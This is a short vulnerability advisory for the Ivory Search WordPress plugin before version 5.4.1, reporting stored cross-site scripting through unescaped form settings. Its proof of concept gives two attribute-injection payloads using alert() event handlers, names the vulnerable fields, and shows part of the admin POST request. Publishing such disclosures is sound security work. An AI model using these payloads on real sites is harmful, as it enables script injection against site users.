## WordPress Plugin Vulnerabilities

# Ivory Search < 5.4.1 - Multiple Admin+ Stored Cross-Site Scripting

### Description

The plugin does not escape some of the Form settings, which could allow high privilege users to perform Cross-Site Scripting attacks even when the unfiltered\_html capability is disallowed.

### Proof of Concept

Go to the AJAX settings of a Form and put the following payload in the "Minimum number of characters required to run ajax search." (min\_no\_for\_search field) or "Text when there is no search results" (nothing\_found\_text field) settings: "style=animation-name:rotation onanimationstart=alert(/XSS/)// yo="
Note: The min\_no\_for\_search field is only validated to be a number client side.
For the \_is\_settings[highlight\_color] parameter, a payload such as " autofocus=autofocus onfocus=alert(/XSS/)// oni=" can be used
POST /wp-admin/admin.php?page=ivory-search&post=14&tab=options HTTP/2
Cookie: [admin cookies]
Content-Type: application/x-www-form-urlencoded
